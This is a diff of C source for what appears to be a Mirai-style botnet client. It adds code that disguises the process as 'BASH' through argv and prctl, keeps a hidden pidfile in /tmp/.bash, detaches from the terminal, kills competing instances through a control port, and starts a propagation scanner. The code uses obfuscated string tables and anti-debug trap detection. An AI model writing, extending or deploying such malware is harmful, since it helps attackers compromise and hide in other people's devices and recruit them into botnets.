@@ -8,6 +8,7 @@
 #include <unistd.h>
 
 #include <sys/time.h>
+#include <sys/prctl.h>
 #include <sys/ptrace.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
@@ -15,16 +16,18 @@
 #include "xhdrs/includes.h"
 #include "xhdrs/net.h"
 #include "xhdrs/packet.h"
+#include "xhdrs/scanner.h"
 //#include "xhdrs/sha256.h"
 #include "xhdrs/table.h"
 #include "xhdrs/utils.h"
 
+FILE *pidfd;
 time_t proc_startup;
 sig_atomic_t exiting = 0;
 
 uint32_t table_key = 0xdeadbeef; // util_strxor; For packets only?
 
-static int sockfd = -1;
+static int sockfd = -1, fd_ctrl = -1;
 static char uniq_id[32] = "";
 static char *pidfile = "/tmp/.bash";
 
@@ -38,7 +41,7 @@ static void init_exit(void)
     if(!access(pidfile, F_OK) && !access(pidfile, R_OK))
 	{
 #ifdef DEBUG
-		util_msgc("Info", "Attempting to kill rouge process!");
+		util_msgc("Info", "Removing PIDFILE: %s", pidfile);
 #endif
 		remove(pidfile);
     }
@@ -57,13 +60,6 @@ static void sigexit(int signo)
 	init_exit();
 }
 
-static void sigsegv(int signo)
-{
-	util_msgc("Error", "Caught Segv!");
-	init_exit();
-	_exit(EXIT_FAILURE);
-}
-
 static void init_signals(void)
 {
     struct sigaction sa;
@@ -76,18 +72,6 @@ static void init_signals(void)
     sa.sa_mask = ss;
     sa.sa_flags = 0;
     sigaction(SIGINT, &sa, 0);
-	
-    sigemptyset(&ss);
-    sa.sa_handler = sigsegv;
-    sa.sa_mask = ss;
-    sa.sa_flags = 0;
-    sigaction(SIGSEGV, &sa, 0);
-	
-    sigemptyset(&ss);
-    sa.sa_handler = sigsegv;
-    sa.sa_mask = ss;
-    sa.sa_flags = 0;
-    sigaction(SIGBUS, &sa, 0);
 	
 	util_msgc("Info", "Initiated Signals!");
 }
@@ -127,7 +111,7 @@ static void init_uniq_id(void)
 #endif
 		_exit(EXIT_FAILURE);
 	}
-		
+	
 	close(fd);
 	
 	for(offset = 0; offset < 20; offset++)
@@ -183,36 +167,97 @@ static void init_trap_detect(void)
 }
 #endif
 
-static void ensure_single_instance(void)
+static void kill_instance_by_pid(void)
 {
 	unsigned int pidc;
 	
-    FILE *pidfd;
-    
-    if(!access(pidfile, F_OK) && !access(pidfile, R_OK))
-    {
+	// Check pidfile is existant and readable
+	if(!access(pidfile, F_OK) && !access(pidfile, R_OK))
+	{
 		if((pidfd = fopen(pidfile, "r+")) != NULL)
 		{
 #ifdef DEBUG
 			util_msgc("Info", "Attempting to kill rouge process!");
 #endif
-            while(fscanf(pidfd, "%d", &pidc) == 2);
-            fclose(pidfd);
-            kill(pidc, SIGKILL);
-            remove(pidfile);
-        }
-    }
-#ifdef DEBUG
-	else
-	{
-		util_msgc("Info", "We're the only instance running!");
+			while(fscanf(pidfd, "%d", &pidc) == 2);
+			fclose(pidfd);
+			kill(pidc, SIGKILL);
+			remove(pidfile);
+		}
 	}
-#endif
+}
+
+static void ensure_single_instance(void)
+{
+	int val = 1;
+	static BOOL local_bind = TRUE;
     
-    if((pidfd = fopen(pidfile, "a+")) != NULL)
+	struct sockaddr_in addr;
+	
+    if((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+        return;
+	
+    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
+    
+	net_set_nonblocking(fd_ctrl);
+
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
+    addr.sin_port = atoi(SINGLE_INSTANCE_PORT);
+
+    // Try to bind to the control port
+    errno = 0;
+    if(bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) < 0)
     {
-        fprintf(pidfd, "%d", getpid());
-        fclose(pidfd);
+        if(errno == EADDRNOTAVAIL && local_bind)
+            local_bind = FALSE;
+		
+		/*
+#ifdef DEBUG
+        util_msgc("Info", "Another instance is already running (errno = %d)! "
+			"Sending kill request...", errno);
+#endif
+		
+        // Reset addr just in case
+        addr.sin_family = AF_INET;
+        addr.sin_addr.s_addr = INADDR_LOOPBACK;
+        addr.sin_port = atoi(SINGLE_INSTANCE_PORT);
+		
+        if(connect(fd_ctrl, (struct sockaddr*)&addr, sizeof(struct sockaddr_in)) < 0)
+        {
+#ifdef DEBUG
+			util_msgc("Error", "Failed to connect to fd_ctrl "
+				"to request process termination");
+#endif
+        }
+        */
+		
+        close(fd_ctrl);
+        kill_instance_by_pid();
+        ensure_single_instance(); // Call again, so that we are now the control
+    }
+    else
+    {
+        if(listen(fd_ctrl, 1) < 0)
+        {
+#ifdef DEBUG
+            util_msgc("Error", "Failed to call listen() on fd_ctrl");
+            close(fd_ctrl);
+            kill_instance_by_pid();
+            ensure_single_instance();
+#endif
+        }
+		
+		// Put our PID into pidfile
+		if((pidfd = fopen(pidfile, "a+")) != NULL)
+		{
+			fprintf(pidfd, "%d", getpid());
+			fclose(pidfd);
+		}
+		
+#ifdef DEBUG
+        util_msgc("Info", "We are the only process on this system!");
+#endif
     }
 }
 
@@ -240,24 +285,37 @@ int main(int argc, char *argv[])
 	ssize_t buflen;
 	char pktbuf[512];
 	
-	proc_startup = time(NULL);
-	
-	ensure_single_instance();
-	
 #ifdef DEBUG
 	struct in_addr ip4;
 #endif
 	struct Packet pkt;
+	
+	proc_startup = time(NULL);
+	
+	init_signals();
+	init_uniq_id();
+	
+	LOCAL_ADDR = net_local_addr();
+	
+	ensure_single_instance();
 	
 #ifndef DEBUG	
 	init_trap_detect();
 	
 	ensure_background_process();
 	
+    pgid = setsid();
+    close(STDIN);
+    close(STDOUT);
+    close(STDERR);
+	
 	int i;
 	for(i = 0; argv[0][i] != 0; i++)
 		argv[0][i] = 0;
+	// Hide Argv0 name
 	strcpy(argv[0], "BASH");
+	// Hide Process name
+	prctl(PR_SET_NAME, "BASH");
 	
 	chdir("/")
 	
@@ -271,12 +329,21 @@ int main(int argc, char *argv[])
 	}
 #endif
 	
-	init_signals();
-	init_uniq_id();
-	
 	table_init();
+
+#ifndef DEBUG
+	int tbl_exec_succ_len;
+	char *tbl_exec_succ;
 	
-	LOCAL_ADDR = net_local_addr();
+    // Print out system exec
+    table_unlock_val(TABLE_EXEC_SUCCESS);
+    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
+    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
+    write(STDOUT, "\n", 1);
+    table_lock_val(TABLE_EXEC_SUCCESS);
+#endif
+	
+	scanner_init();
 	
 	while(!exiting)
 	{
